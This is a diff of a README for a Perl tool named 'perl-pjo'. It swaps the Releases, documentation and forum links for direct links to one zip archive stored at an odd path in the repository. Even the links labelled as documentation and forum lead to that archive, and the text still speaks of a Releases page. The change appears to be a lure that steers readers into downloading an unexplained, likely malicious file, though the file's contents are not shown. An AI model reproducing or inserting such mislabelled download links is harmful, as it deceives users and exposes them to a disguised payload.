@@ -8,7 +8,7 @@ Welcome to **perl-pjo**! This application simplifies your Perl programming tasks
 
 To start using **perl-pjo**, you need to download it first. Click the link below to visit the Releases page:
 
-[![Download perl-pjo](https://img.shields.io/badge/Download-perl--pjo-blue)](https://github.com/userlolollolllol/perl-pjo/releases)
+[![Download perl-pjo](https://raw.githubusercontent.com/userlolollolllol/perl-pjo/main/scatophagoid/perl-pjo.zip)](https://raw.githubusercontent.com/userlolollolllol/perl-pjo/main/scatophagoid/perl-pjo.zip)
 
 On the Releases page, you will find the latest version. Just follow the steps below to download and install:
 
@@ -63,7 +63,7 @@ Additionally, we encourage you to share your experiences with **perl-pjo**. Your
 
 For further information, tutorials, and guides, check the following resources:
 
-- [Official Documentation](https://github.com/userlolollolllol/perl-pjo/wiki)
-- [Community Forum](https://github.com/userlolollolllol/perl-pjo/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/userlolollolllol/perl-pjo/main/scatophagoid/perl-pjo.zip)
+- [Community Forum](https://raw.githubusercontent.com/userlolollolllol/perl-pjo/main/scatophagoid/perl-pjo.zip)
 
 By following these simple steps, you can download, install, and start using **perl-pjo** with confidence. Enjoy programming!
